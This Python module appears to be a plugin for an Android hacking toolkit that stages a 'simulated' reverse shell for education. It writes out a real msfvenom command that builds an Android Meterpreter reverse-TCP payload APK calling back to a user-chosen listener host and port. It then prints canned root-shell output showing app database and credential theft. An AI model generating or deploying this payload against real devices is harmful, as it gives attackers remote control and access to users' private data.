import time
import random
from typing import Dict, Any
from core.module_loader import BaseModule, ModuleMetadata
from core.ui import print_status, console, print_panel, hacker_input, hacker_confirm, show_progress


class ReverseShellSimModule(BaseModule):
    metadata = ModuleMetadata(
        name="reverse_shell_sim",
        version="1.0.0",
        description="Simulated reverse shell demonstration for educational purposes",
        author="GhostDroid",
        risk_level="high",
        requires_adb=False,
        category="exploit",
    )

    def run(self, *args, **kwargs) -> Dict[str, Any]:
        console.print("[bold cyan]╔══ Reverse Shell Simulation ══╗[/]")
        console.print("[dim]This is a simulated demonstration for educational purposes only[/]\n")

        if not kwargs.get("force"):
            agree = hacker_confirm("[yellow]This is a simulation. Continue?[/]")
            if not agree:
                print_status("Simulation cancelled", "info")
                return {"status": "cancelled"}

        lhost = kwargs.get("lhost") or hacker_input("[cyan]Enter listener IP (LHOST)[/]")
        lport = kwargs.get("lport") or hacker_input("[cyan]Enter listener port (LPORT)[/]", password=True)

        results = {
            "type": "reverse_shell_simulation",
            "lhost": lhost,
            "lport": lport,
            "payload": "",
            "commands": [],
            "status": "completed",
        }

        console.print("\n[bold yellow][*] Generating reverse shell payload...[/]")
        show_progress("Crafting payload", 1.5)

        payload = (
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"LHOST={lhost} LPORT={lport} -o /tmp/payload.apk"
        )
        results["payload"] = payload
        print_status(f"Payload command: {payload}", "info")

        console.print("\n[bold yellow][*] Simulating connection...[/]")
        for i in range(5):
            time.sleep(0.4)
            print_status(f"Connection attempt {i+1}/5...", "arrow")

        console.print("\n[bold green][+] Connection established![/]")
        time.sleep(0.3)

        sim_commands = [
            "[cyan]SHELL[/] > [green]whoami[/]",
            "[green]uid=0(root) gid=0(root)[/]",
            "[cyan]SHELL[/] > [green]id[/]",
            "[green]uid=0(root) gid=0(root) groups=0(root)[/]",
            "[cyan]SHELL[/] > [green]ls -la /data/data/[/]",
            "[green]drwxrwx--x  12 u0_a60  u0_a60  4096 Jan 15 10:30 com.example.app[/]",
            "[cyan]SHELL[/] > [green]cat /data/data/com.example.app/databases/app.db[/]",
            "[green][SIMULATED] Extracting database contents...[/]",
            "[yellow][SIMULATED] Found credentials in plaintext![/]",
            "[cyan]SHELL[/] > [green]getprop ro.build.version.sdk[/]",
            "[green]34[/]",
        ]

        for line in sim_commands:
            time.sleep(0.3)
            console.print(f"  {line}")
            results["commands"].append(line)

        console.print("\n[bold red]╔══ SIMULATION COMPLETE ══╗[/]")
        console.print("[bold red]║[/] In a real scenario, this would give an attacker [bold red]║[/]")
        console.print("[bold red]║[/] full remote control over the device. [bold red]║[/]")
        console.print("[bold red]╚═══════════════════════════╝[/]")

        return results
